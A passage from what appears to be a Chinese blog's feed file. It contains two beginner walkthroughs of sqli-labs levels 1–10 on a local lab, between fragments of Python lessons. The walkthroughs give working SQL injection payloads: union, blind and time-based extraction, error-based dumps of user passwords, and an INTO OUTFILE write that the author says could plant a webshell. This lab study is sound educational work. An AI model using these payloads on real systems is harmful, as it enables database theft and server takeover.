class="keyword">return</span> <span class="number">2</span> * radius * pi</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_area</span>(<span class="params">radius</span>):</span><br><span class="line">        <span class="keyword">return</span> pi * radius ** <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 求圆的周长</span></span><br><span class="line">    <span class="keyword">if</span> action == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> get_perimeter(radius)</span><br><span class="line">    <span class="comment"># 求圆的面积</span></span><br><span class="line">    <span class="keyword">elif</span> action == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> get_area(radius)</span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;上面的应用场景比较少 , 函数的嵌套定义更多的用在<code>闭包</code>&#x3D;&#x3D;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 函数的嵌套定义你可以认为把一堆函数丢到一个大容器(最外面的那个函数)中</span></span><br><span class="line"><span class="comment"># 同时在外部是无法访问这个函数的,只能在大容器中访问这些函数</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程学习 </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程学习 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入靶场（二）</title>
      <link href="/2022/07/07/sql_lab_two/"/>
      <url>/2022/07/07/sql_lab_two/</url>
      
        <content type="html"><![CDATA[<h1 id="一、实操环境"><a href="#一、实操环境" class="headerlink" title="一、实操环境"></a>一、实操环境</h1><h2 id="1、操作系统"><a href="#1、操作系统" class="headerlink" title="1、操作系统"></a>1、操作系统</h2><ol><li>VMware虚拟机创建的win10系统</li><li>内存8GB</li><li>硬盘255GB</li><li>处理器AMD Ryzen 9 5900HX</li></ol><h2 id="2、操作项目"><a href="#2、操作项目" class="headerlink" title="2、操作项目"></a>2、操作项目</h2><p><strong>sql-lib项目，本篇文章介绍关卡6-10。</strong></p><h2 id="3、工具版本"><a href="#3、工具版本" class="headerlink" title="3、工具版本"></a>3、工具版本</h2><ol><li><p>phpstudy 8.1.1.3</p></li><li><p>php版本 5.4.45nts</p></li><li><p>Apache2.4.39</p></li><li><p>MySQL5.7.26</p></li><li><p>Chrome</p></li></ol><h2 id="4、SQL注入目的"><a href="#4、SQL注入目的" class="headerlink" title="4、SQL注入目的"></a>4、SQL注入目的</h2><ol><li>判断是否允许注入</li><li>判断注入点类型</li><li>判断回显点</li><li>获取数据库信息</li><li>获取表信息 </li><li>获取字段信息</li></ol><h1 id="二、less-6"><a href="#二、less-6" class="headerlink" title="二、less-6"></a>二、less-6</h1><h2 id="1、判断注入类型"><a href="#1、判断注入类型" class="headerlink" title="1、判断注入类型"></a>1、判断注入类型</h2><p> 首先输入?id&#x3D;1，发现显示You are in….，如果输入?id&#x3D;1’，正常，如果输入?id&#x3D;1’’，则会报错，所以我们先将’’注释掉。<br> <img src="http://120.48.107.243:9090/blog/2023/04/03/3248487e31e14c14b7b3ab7bef5a5585.png" alt="在这里插入图片描述"></p><h2 id="2、判断回显点和字段数"><a href="#2、判断回显点和字段数" class="headerlink" title="2、判断回显点和字段数"></a>2、判断回显点和字段数</h2><p>剩下的和第五关一样了，只是单引号变成了双引号。<br><a href="http://sql/Less-6/?id=1&quot;">http://sql/Less-6/?id=1&quot;</a> order by 3–+<br><img src="http://120.48.107.243:9090/blog/2023/04/03/849e3c16d4e1496ba0e3e3f053a5d2cf.png" alt="在这里插入图片描述"></p><h2 id="3、获取数据库信息"><a href="#3、获取数据库信息" class="headerlink" title="3、获取数据库信息"></a>3、获取数据库信息</h2><h3 id="（1）获取库名长度"><a href="#（1）获取库名长度" class="headerlink" title="（1）获取库名长度"></a>（1）获取库名长度</h3><p><a href="http://sql/Less-6/?id=1&quot;">http://sql/Less-6/?id=1&quot;</a> and length(database())&#x3D;8–+<br><img src="http://120.48.107.243:9090/blog/2023/04/03/9a0295c32c654e9c999b4fd503a81465.png" alt="在这里插入图片描述"></p><h3 id="（2）获取库名"><a href="#（2）获取库名" class="headerlink" title="（2）获取库名"></a>（2）获取库名</h3><p><a href="http://sql/Less-6/?id=1&quot;">http://sql/Less-6/?id=1&quot;</a> and ascii(substr(database(),1,1))&#x3D;115–+<br><img src="http://120.48.107.243:9090/blog/2023/04/03/f32c324c805e43e086bd8b852fbd2bd4.png" alt="在这里插入图片描述"></p><h2 id="4、获取表信息"><a href="#4、获取表信息" class="headerlink" title="4、获取表信息"></a>4、获取表信息</h2><h3 id="（1）获取表名长度"><a href="#（1）获取表名长度" class="headerlink" title="（1）获取表名长度"></a>（1）获取表名长度</h3><p><a href="http://sql/Less-6/?id=1&quot;">http://sql/Less-6/?id=1&quot;</a> and length((select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 0,1))&#x3D;6–+<br><img src="http://120.48.107.243:9090/blog/2023/04/03/9ac5a42c4356483fbddff400af0b5163.png" alt="在这里插入图片描述"></p><h3 id="（2）获取表名"><a href="#（2）获取表名" class="headerlink" title="（2）获取表名"></a>（2）获取表名</h3><p><a href="http://sql/Less-6/?id=1&quot;">http://sql/Less-6/?id=1&quot;</a> and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 0,1),1,1))&#x3D;101–+<br><img src="http://120.48.107.243:9090/blog/2023/04/03/19a49cedffd04984a4b9b305d4ebe26e.png" alt="在这里插入图片描述"></p><h2 id="5、获取字段信息"><a href="#5、获取字段信息" class="headerlink" title="5、获取字段信息"></a>5、获取字段信息</h2><p><a href="http://sql/Less-6/?id=1&quot;">http://sql/Less-6/?id=1&quot;</a> and ascii(substr((select column_name from information_schema.columns where table_schema&#x3D;’security’ and table_name&#x3D;’users’ limit 0,1),1,1))&#x3D;105–+<br><img src="http://120.48.107.243:9090/blog/2023/04/03/834438071ed642b4bd80b49ec1e8380e.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/bc386fed4c5d474cafd01bb906276015.png" alt="在这里插入图片描述"></p><h1 id="三、less-7"><a href="#三、less-7" class="headerlink" title="三、less-7"></a>三、less-7</h1><h2 id="1、这一关比较复杂"><a href="#1、这一关比较复杂" class="headerlink" title="1、这一关比较复杂"></a>1、这一关比较复杂</h2><p>输入?id&#x3D;1，发现显示You are in…Use outfile，在数据库中，file权限规定了数据库用户是否有权限向操作系统内写入和读取已存在文件的权限，into outfile命令是file系列函数来进行读取敏感文件或者写入webshell的。这里需要多次尝试，最后发现是1’))，这一关主要是往服务器上写入文件，比如一句话木马什么的，需要一个存储文件的路径。这里使用@@basedir和@@datadir。<br><strong>需要在前几关查找参数</strong>。<br>在第二关找到位置。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/bb49d11a7046472686d76358dcc88da0.png" alt="在这里插入图片描述"><br>然后插入在路径下写入一个文件名为test的php文件，注意这里路径要用双反斜杠，否则新建的文件名会加前缀。<a href="http://sql/Less-7/?id=1&#39;">http://sql/Less-7/?id=1&#39;</a>)) union select 1,2,3 into outfile “E:\phpstudy_pro\Extensions\MySQL5.7.26\data\test.php”–+（&#x3D;&#x3D;注意是双反斜杠，这里一个斜杠是显示错误&#x3D;&#x3D;）<br>虽然会报错，但还是可以发现成功了。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/4a3d24b09c59412283d3760f59a51546.png" alt="在这里插入图片描述"></p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/1a90ce52973f41aa8e85bf8fb8e35944.png" alt="在这里插入图片描述"><br>打开文件可以发现里面有信息。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/f544cfbcbaa14ea7882321cb174d7830.png" alt="在这里插入图片描述"><br>之后可以写入一句话木马，使用菜刀工具顺藤摸瓜找到数据库管理员密码。</p><h1 id="四、less-8"><a href="#四、less-8" class="headerlink" title="四、less-8"></a>四、less-8</h1><h2 id="1、判断注入类型-1"><a href="#1、判断注入类型-1" class="headerlink" title="1、判断注入类型"></a>1、判断注入类型</h2><p>输入?id&#x3D;1正常显示，输入?id&#x3D;1’返回为空，输入?id&#x3D;1’’正常显示，通过回显信息可以看出是字符型注入，而且是布尔盲注，接下来就和上一文章的less5一样了，根据回显判断。</p><h2 id="2、判断回显点和字段数-1"><a href="#2、判断回显点和字段数-1" class="headerlink" title="2、判断回显点和字段数"></a>2、判断回显点和字段数</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/d4233fe5ff5642ceb77cf3f997f4a126.png" alt="在这里插入图片描述"></p><h2 id="3、获取数据库信息-1"><a href="#3、获取数据库信息-1" class="headerlink" title="3、获取数据库信息"></a>3、获取数据库信息</h2><h3 id="（1）获取库名长度-1"><a href="#（1）获取库名长度-1" class="headerlink" title="（1）获取库名长度"></a>（1）获取库名长度</h3><p><img src="http://120.48.107.243:9090/blog/2023/04/03/29fe75db534744b29ac8d2dc1dca484a.png" alt="在这里插入图片描述"></p><h3 id="（2）获取库名-1"><a href="#（2）获取库名-1" class="headerlink" title="（2）获取库名"></a>（2）获取库名</h3><p><img src="http://120.48.107.243:9090/blog/2023/04/03/913d41cb58fd4c349fea62773725bf88.png" alt="在这里插入图片描述"></p><h2 id="4、获取表信息-1"><a href="#4、获取表信息-1" class="headerlink" title="4、获取表信息"></a>4、获取表信息</h2><h3 id="（1）获取表名长度-1"><a href="#（1）获取表名长度-1" class="headerlink" title="（1）获取表名长度"></a>（1）获取表名长度</h3><p><img src="http://120.48.107.243:9090/blog/2023/04/03/e46a4038968c496fa4e77a17641522ef.png" alt="在这里插入图片描述"></p><h3 id="（2）获取表名-1"><a href="#（2）获取表名-1" class="headerlink" title="（2）获取表名"></a>（2）获取表名</h3><p><img src="http://120.48.107.243:9090/blog/2023/04/03/8b1856d674c24da2b55f9a7ba16654cc.png" alt="在这里插入图片描述"></p><h2 id="5、获取字段信息-1"><a href="#5、获取字段信息-1" class="headerlink" title="5、获取字段信息"></a>5、获取字段信息</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/957141f73b1541e399334b271067d1bd.png" alt="在这里插入图片描述"></p><h1 id="五、less-9"><a href="#五、less-9" class="headerlink" title="五、less-9"></a>五、less-9</h1><h2 id="1、判断注入类型-2"><a href="#1、判断注入类型-2" class="headerlink" title="1、判断注入类型"></a>1、判断注入类型</h2><p>首先判断是字符型注入，而且报错注入也不能用，所以尝试延迟注入，发现使用&gt;&lt;判断的时候都是对的，所以布尔也不能用。<br>在这里发现输入<a href="http://sql/Less-9/?id=1&#39;">http://sql/Less-9/?id=1&#39;</a> and if(1&#x3D;2,1,sleep(5)) –+闭合。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/e3972e7d357e40e7935bb484f07d1f4f.png" alt="在这里插入图片描述"></p><h2 id="2、获取数据库信息"><a href="#2、获取数据库信息" class="headerlink" title="2、获取数据库信息"></a>2、获取数据库信息</h2><h3 id="（1）获取库名长度-2"><a href="#（1）获取库名长度-2" class="headerlink" title="（1）获取库名长度"></a>（1）获取库名长度</h3><p>可以看到转圈圈。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/01535fddd38a43d1a8f4a47c3672b72b.png" alt="在这里插入图片描述"></p><h3 id="（2）获取库名-2"><a href="#（2）获取库名-2" class="headerlink" title="（2）获取库名"></a>（2）获取库名</h3><p>获取库名。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/da84b0d3fbb948a9abc5163b3745982e.png" alt="在这里插入图片描述"></p><h2 id="3、获取表信息"><a href="#3、获取表信息" class="headerlink" title="3、获取表信息"></a>3、获取表信息</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/fcf99c92729f44749fdb5d0203808862.png" alt="在这里插入图片描述"></p><h2 id="4、获取字段信息"><a href="#4、获取字段信息" class="headerlink" title="4、获取字段信息"></a>4、获取字段信息</h2><p>和less5一样。</p><h1 id="六、less-10"><a href="#六、less-10" class="headerlink" title="六、less-10"></a>六、less-10</h1><h2 id="1、判断注入类型-3"><a href="#1、判断注入类型-3" class="headerlink" title="1、判断注入类型"></a>1、判断注入类型</h2><p>这一关就是双引号了，sleep生效。<br><a href="http://sql/Less-10/?id=1&quot;">http://sql/Less-10/?id=1&quot;</a> and if(1&#x3D;2,1,sleep(5)) %23<br><img src="http://120.48.107.243:9090/blog/2023/04/03/e4fc7eede0824ccbadf0b6b0d726aafe.png" alt="在这里插入图片描述"></p><h2 id="2、获取数据库信息-1"><a href="#2、获取数据库信息-1" class="headerlink" title="2、获取数据库信息"></a>2、获取数据库信息</h2><h3 id="（1）获取库名长度-3"><a href="#（1）获取库名长度-3" class="headerlink" title="（1）获取库名长度"></a>（1）获取库名长度</h3><p>输入<a href="http://sql/Less-10/?id=1&quot;">http://sql/Less-10/?id=1&quot;</a> and if(length(database())&lt;9,sleep(10),1) %23。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/aa1c1b2abfe84ac88cb865217a706ab8.png" alt="在这里插入图片描述"></p><h3 id="（2）获取库名-3"><a href="#（2）获取库名-3" class="headerlink" title="（2）获取库名"></a>（2）获取库名</h3><p>输入<a href="http://sql/Less-10/?id=1&quot;">http://sql/Less-10/?id=1&quot;</a> and  if(ascii(substring(database(),1,1))&#x3D;’110’,1,sleep(5)) %23。可以获取。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/ed247f303ea240a5aa0c43ba23fc340e.png" alt="在这里插入图片描述"></p><h2 id="3、获取表信息-1"><a href="#3、获取表信息-1" class="headerlink" title="3、获取表信息"></a>3、获取表信息</h2><h3 id="（1）获取表名长度-2"><a href="#（1）获取表名长度-2" class="headerlink" title="（1）获取表名长度"></a>（1）获取表名长度</h3><p>输入<a href="http://sql/Less-10/?id=1&quot;and">http://sql/Less-10/?id=1&quot;and</a> if((select count(*)from information_schema.tables where table_schema&#x3D;database() )&#x3D;4,sleep(5),1) %23，发现有四张表，用length可以判断长度。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/2df58ab5f0e14ccaba0926142f4346d1.png" alt="在这里插入图片描述"></p><p>剩下的就和第九关一样了。</p><h1 id="七、总结与小记"><a href="#七、总结与小记" class="headerlink" title="七、总结与小记"></a>七、总结与小记</h1><p>本篇文章为sql-lib的第六关到第十关，还在初学阶段，请各位海涵。</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 打靶记录 </category>
          
          <category> SQL注入靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
            <tag> 打靶记录 </tag>
            
            <tag> SQL注入靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入靶场（一）</title>
      <link href="/2022/06/27/sql_lab_one/"/>
      <url>/2022/06/27/sql_lab_one/</url>
      
        <content type="html"><![CDATA[<h1 id="一、实操环境"><a href="#一、实操环境" class="headerlink" title="一、实操环境"></a>一、实操环境</h1><h2 id="1、操作系统"><a href="#1、操作系统" class="headerlink" title="1、操作系统"></a>1、操作系统</h2><ol><li>VMware虚拟机创建的win10系统</li><li>内存8GB</li><li>硬盘255GB</li><li>处理器AMD Ryzen 9 5900HX</li></ol><h2 id="2、操作项目"><a href="#2、操作项目" class="headerlink" title="2、操作项目"></a>2、操作项目</h2><p><strong>sql-lib项目，本篇文章介绍关卡1-5。</strong></p><h2 id="3、工具版本"><a href="#3、工具版本" class="headerlink" title="3、工具版本"></a>3、工具版本</h2><ol><li><p>phpstudy 8.1.1.3</p></li><li><p>php版本 5.4.45nts</p></li><li><p>Apache2.4.39</p></li><li><p>MySQL5.7.26</p></li><li><p>Chrome</p></li></ol><h2 id="4、SQL注入目的"><a href="#4、SQL注入目的" class="headerlink" title="4、SQL注入目的"></a>4、SQL注入目的</h2><ol><li>判断是否允许注入</li><li>判断注入点类型</li><li>判断回显点</li><li>获取数据库信息</li><li>获取表信息 </li><li>获取字段信息</li></ol><h1 id="二、less-1"><a href="#二、less-1" class="headerlink" title="二、less-1"></a>二、less-1</h1><h2 id="1-判断注入类型"><a href="#1-判断注入类型" class="headerlink" title="1. 判断注入类型"></a>1. 判断注入类型</h2><p> 首先输入?id&#x3D;1。<br> <img src="http://120.48.107.243:9090/blog/2023/04/03/f7311e9763bc4ba893ee1ff9d1224ce2.png" alt="在这里插入图片描述"><br>输入?id&#x3D;1’<br><img src="http://120.48.107.243:9090/blog/2023/04/03/bcb700bb68284f40bc170a672ff9aee6.png" alt="在这里插入图片描述"><br>输入?id&#x3D;1’ –+，语句正常，输入?id&#x3D;1 and 1&#x3D;1以及?id&#x3D;1 and 1&#x3D;2都正常，说明是<strong>单引号字符型注入</strong>。</p><h2 id="2、判断字段数。"><a href="#2、判断字段数。" class="headerlink" title="2、判断字段数。"></a>2、判断字段数。</h2><p>输入?id&#x3D;1’ order by 3–+，正常显示，输入?id&#x3D;1’ order by 4–+，报错，所以有三列数据。<br>  <img src="http://120.48.107.243:9090/blog/2023/04/03/dab646b69ec544008e6969904a6bcf53.png" alt="在这里插入图片描述"><br> <img src="http://120.48.107.243:9090/blog/2023/04/03/564c8d8d34c84372a1a4a7051ffb1687.png" alt="在这里插入图片描述"></p><h2 id="3、获取回显点"><a href="#3、获取回显点" class="headerlink" title="3、获取回显点"></a>3、获取回显点</h2><p>输入?id&#x3D;796（&#x3D;&#x3D;这里是不存在的id&#x3D;&#x3D;）’ union select  1,2,3 –+ ，这里正常显示，所以有三列数据，有两个显示位。<br>  <img src="http://120.48.107.243:9090/blog/2023/04/03/9115aa41fe6c4629a4d63e7d6f9c87d5.png" alt="在这里插入图片描述"></p><h2 id="4、获取数据库信息"><a href="#4、获取数据库信息" class="headerlink" title="4、获取数据库信息"></a>4、获取数据库信息</h2><h3 id="（1）获取数据库名长度"><a href="#（1）获取数据库名长度" class="headerlink" title="（1）获取数据库名长度"></a>（1）获取数据库名长度</h3><p>  输入id&#x3D;1’ and length(database())&#x3D;8（&#x3D;&#x3D;这里是猜测，可以换&#x3D;&#x3D;）–+，如果正确，则会正常显示，如果错误，则会返回空，这里可以知道数据库的名字长度为8。<br>  <img src="http://120.48.107.243:9090/blog/2023/04/03/f99357162f60400f84870c854f61f7e2.png" alt="在这里插入图片描述"></p><h3 id="（2）获取数据库名"><a href="#（2）获取数据库名" class="headerlink" title="（2）获取数据库名"></a>（2）获取数据库名</h3><p> 输入?id&#x3D;1’ and ascii(substr(database(),1,1))&#x3D;115（&#x3D;&#x3D;这个是ascii码，可以换&#x3D;&#x3D;）–+，如果正确，则会正常显示，如果错误，则会返回空，根据上一条获取的数据库名字长度，对substr截取的位置进行更改，可以查询到完整的数据库名字，这里的数据库名字为security。<br> <img src="http://120.48.107.243:9090/blog/2023/04/03/acf577cd17654f7aae59bfa2852b81ec.png" alt="在这里插入图片描述"></p><h2 id="5、获取表信息"><a href="#5、获取表信息" class="headerlink" title="5、获取表信息"></a>5、获取表信息</h2><h3 id="（1）首先获取表名长度。"><a href="#（1）首先获取表名长度。" class="headerlink" title="（1）首先获取表名长度。"></a>（1）首先获取表名长度。</h3><p>  输入?id&#x3D;1’ and length((select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 0,1))&#x3D;6–+。（&#x3D;&#x3D;这里是从security库中截取第一个表，并判断该表的名字长度，如果符合上面填的6，则返回正常，否则返回空&#x3D;&#x3D;）<br>  <img src="http://120.48.107.243:9090/blog/2023/04/03/3138047138194602bf682b7319d8c94f.png" alt="在这里插入图片描述"></p><h3 id="（2）获取表名。"><a href="#（2）获取表名。" class="headerlink" title="（2）获取表名。"></a>（2）获取表名。</h3><p> 和数据库名字一样，可以用ascii码判断，也可以直接用等于判断，这里输入?id&#x3D;1’ and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 0,1),1,1))&#x3D;101–+。最后匹配完成全字符第一个表是emails。<br> <img src="http://120.48.107.243:9090/blog/2023/04/03/30e196a42cad4b23b97cd4c7561a6665.png" alt="在这里插入图片描述"></p><h2 id="6、获取字段信息"><a href="#6、获取字段信息" class="headerlink" title="6、获取字段信息"></a>6、获取字段信息</h2><p>这里输入?id&#x3D;1’ and ascii(substr((select column_name from information_schema.columns where table_schema&#x3D;’security’ and table_name&#x3D;’users’ limit 0,1),1,1))&#x3D;105–+。&#x3D;&#x3D;这里查询的是security库中，users表中的第一个字段的对应ascii码是否为105，如果是，则返回正常，否则返回为空。<br>  <img src="http://120.48.107.243:9090/blog/2023/04/03/3985e5d1535940c99c3cfb22f72d213a.png" alt="在这里插入图片描述"><br> 最后可以输入?id&#x3D;-1’ union select 1,2,group_concat(concat_ws(‘~’,username,password)) from security.users –+。来获取到详细信息。<br> <img src="http://120.48.107.243:9090/blog/2023/04/03/589a8ded0e104f76be6e026c98151a05.png" alt="在这里插入图片描述"></p><h1 id="三、less-2"><a href="#三、less-2" class="headerlink" title="三、less-2"></a>三、less-2</h1><h2 id="1、判断注入类型"><a href="#1、判断注入类型" class="headerlink" title="1、判断注入类型"></a>1、判断注入类型</h2><p>输入?id&#x3D;1 and 1&#x3D;1–+返回正常，输入?id&#x3D;1 and 1&#x3D;2–+返回为空，所以判断为数字型注入。</p><h2 id="2、判断回显点"><a href="#2、判断回显点" class="headerlink" title="2、判断回显点"></a>2、判断回显点</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/293d221def424f418767f07ec53f01be.png" alt="在这里插入图片描述"><br> 发现这个表有三列。</p><ol><li><p>获取数据库信息<br><strong>和第一关一样，但要注意把?id&#x3D;1后面的单引号去掉，因为本关是数字型注入。</strong></p></li><li><p>获取表信息<br><strong>和第一关一样，但要注意把?id&#x3D;1后面的单引号去掉，因为本关是数字型注入。</strong></p></li><li><p>获取字段信息<br><strong>和第一关一样，但要注意把?id&#x3D;1后面的单引号去掉，因为本关是数字型注入。</strong></p></li></ol><h1 id="四、less-3"><a href="#四、less-3" class="headerlink" title="四、less-3"></a>四、less-3</h1><h2 id="1、判断注入类型-1"><a href="#1、判断注入类型-1" class="headerlink" title="1、判断注入类型"></a>1、判断注入类型</h2><p>输入?id&#x3D;1 正常显示，输入?id&#x3D;1’ 报错。<br>  <img src="http://120.48.107.243:9090/blog/2023/04/03/edcb3e82dff94919b68741b2b6d27ba4.png" alt="在这里插入图片描述"><br> 从报错信息可用发现1被（’’）包裹，所以只需要将’)注释掉即可，输入?id&#x3D;1’)–+。返回正常。<br> <img src="http://120.48.107.243:9090/blog/2023/04/03/d51263adccfc4a3b8392d9b8155d49ee.png" alt="在这里插入图片描述"></p><h2 id="2、判断回显点-1"><a href="#2、判断回显点-1" class="headerlink" title="2、判断回显点"></a>2、判断回显点</h2><p>输入?id&#x3D;1’) order by 3–+，正常显示，输入4报错。<img src="http://120.48.107.243:9090/blog/2023/04/03/33e8af04bf5c4109947a56bcaf1ad9c7.png" alt="在这里插入图片描述"></p><h2 id="3、获取数据库信息"><a href="#3、获取数据库信息" class="headerlink" title="3、获取数据库信息"></a>3、获取数据库信息</h2><p>获取数据库名字长度。<br>  <img src="http://120.48.107.243:9090/blog/2023/04/03/09fe6d5ffca04752a5b7e939f199c6a6.png" alt="在这里插入图片描述"></p><p> 获取数据库名字。<img src="http://120.48.107.243:9090/blog/2023/04/03/67037df021b9432abc543699a5947ea5.png" alt="在这里插入图片描述"></p><h2 id="4、获取表信息"><a href="#4、获取表信息" class="headerlink" title="4、获取表信息"></a>4、获取表信息</h2><p>获取表名长度。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/a982a1ab38ee4eeb87359eab06ebb2c3.png" alt="在这里插入图片描述"><br>获取表名。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/bf07e45d79de435f82e7f93a77da5b5d.png" alt="在这里插入图片描述"></p><h2 id="5、获取字段信息"><a href="#5、获取字段信息" class="headerlink" title="5、获取字段信息"></a>5、获取字段信息</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/78c2c414d70c49f5a1160eae0d384eb5.png" alt="在这里插入图片描述"><br> <img src="http://120.48.107.243:9090/blog/2023/04/03/ba15f3326a3e4f6f82a89e5a409c7c7f.png" alt="在这里插入图片描述"></p><h1 id="五、less-4"><a href="#五、less-4" class="headerlink" title="五、less-4"></a>五、less-4</h1><h2 id="1、判断注入类型-2"><a href="#1、判断注入类型-2" class="headerlink" title="1、判断注入类型"></a>1、判断注入类型</h2><p>输入?id&#x3D;1，可以发现1被（“”）包裹，所以我们只需要将”）注释掉即可，这里输入?id&#x3D;1”)–+即可。<br> <img src="http://120.48.107.243:9090/blog/2023/04/03/9dbffd9809da46279a9552011774c848.png" alt="在这里插入图片描述"></p><h2 id="2、判断回显点-2"><a href="#2、判断回显点-2" class="headerlink" title="2、判断回显点"></a>2、判断回显点</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/26f33a09f99d4012b9ca3ad16464eb71.png" alt="在这里插入图片描述"></p><h2 id="3、获取数据库信息-1"><a href="#3、获取数据库信息-1" class="headerlink" title="3、获取数据库信息"></a>3、获取数据库信息</h2><p>库名长度。<img src="http://120.48.107.243:9090/blog/2023/04/03/d612a4d54498405ebe5ed9d9321689b5-20230403143255777.png" alt="在这里插入图片描述"><br>  库名。<br>  <img src="http://120.48.107.243:9090/blog/2023/04/03/21a061d01cce49e3b72ad69721895fb8.png" alt="在这里插入图片描述"></p><h2 id="4、获取表信息-1"><a href="#4、获取表信息-1" class="headerlink" title="4、获取表信息"></a>4、获取表信息</h2><p>获取表长度。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/b615f4251ac64cfeac478289917f352f.png" alt="在这里插入图片描述"><br>获取表名。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/9517c0abca2148a698ccbadd2d09e069.png" alt="在这里插入图片描述"></p><h2 id="5、获取字段信息-1"><a href="#5、获取字段信息-1" class="headerlink" title="5、获取字段信息"></a>5、获取字段信息</h2><p>这里的table_name可以去掉了。<img src="http://120.48.107.243:9090/blog/2023/04/03/4fb8f08a564747b2a22a324ee8abf633.png" alt="在这里插入图片描述"><img src="http://120.48.107.243:9090/blog/2023/04/03/a306997d7b1a41fb8e8d7beeb99d7c3d.png" alt="在这里插入图片描述"></p><h1 id="六、less-5"><a href="#六、less-5" class="headerlink" title="六、less-5"></a>六、less-5</h1><h2 id="1、判断注入类型-3"><a href="#1、判断注入类型-3" class="headerlink" title="1、判断注入类型"></a>1、判断注入类型</h2><p>首先输入?id&#x3D;1，发现显示You are in….，如果输入?id&#x3D;1’，则会报错，所以我们先将’注释掉。<br> <img src="http://120.48.107.243:9090/blog/2023/04/03/3b309645ab11423eb4df689b4ec924b8.png" alt="在这里插入图片描述"></p><h2 id="2、判断回显点-3"><a href="#2、判断回显点-3" class="headerlink" title="2、判断回显点"></a>2、判断回显点</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/bc073cd30a9044a4b25cec72dcabc940.png" alt="在这里插入图片描述"></p><h2 id="3、获取数据库信息-2"><a href="#3、获取数据库信息-2" class="headerlink" title="3、获取数据库信息"></a>3、获取数据库信息</h2><p>可以获取到数据库名长度<br>  <img src="http://120.48.107.243:9090/blog/2023/04/03/fb2a6b41f4ba41b3b13e2b0ef555ea78.png" alt="在这里插入图片描述"><br> 也可以根据判断，猜出数据库名。<br> <img src="http://120.48.107.243:9090/blog/2023/04/03/34be09d69c9347fabcb8506be81d3d54.png" alt="在这里插入图片描述"></p><h2 id="4、获取表信息-2"><a href="#4、获取表信息-2" class="headerlink" title="4、获取表信息"></a>4、获取表信息</h2><p>表名长度。<br> <img src="http://120.48.107.243:9090/blog/2023/04/03/c72c6ee70173461bb395f8f5f82c1625.png" alt="在这里插入图片描述"><br> 表名。<br> <img src="http://120.48.107.243:9090/blog/2023/04/03/eee5546db0dd48509782abb8e16ba5b2.png" alt="在这里插入图片描述"></p><h2 id="5、获取字段信息-2"><a href="#5、获取字段信息-2" class="headerlink" title="5、获取字段信息"></a>5、获取字段信息</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/bfb65ebd52644f7b8fd36544b3c9ad73.png" alt="在这里插入图片描述"><br>但是在让其打印全部信息时出现了问题，因为他只会返回You are in…。这里我们可以使用?id&#x3D;-1’ union select count(*),1,concat(‘<del>‘,(select concat_ws(‘[‘,password,username) from users limit 0,1),’</del>‘,floor(rand()*2)) as a from information_schema.tables group by a–+。让其将我们要查找的信息在报错信息中返回。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/7ffaef39411347a7ab2c2208dfe90002.png" alt="在这里插入图片描述"></p><h1 id="七、总结与小计"><a href="#七、总结与小计" class="headerlink" title="七、总结与小计"></a>七、总结与小计</h1><p>以上是sql-lib的1-5关关卡，需要有一定mysql基础和计算机思维能力，如果有什么错误请大家在评论区留言，感谢。</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 打靶记录 </category>
          
          <category> SQL注入靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
            <tag> 打靶记录 </tag>
            
            <tag> SQL注入靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python学习日记（十三）</title>
      <link href="/2022/06/20/python_thirteen/"/>
      <url>/2022/06/20/python_thirteen/</url>
      
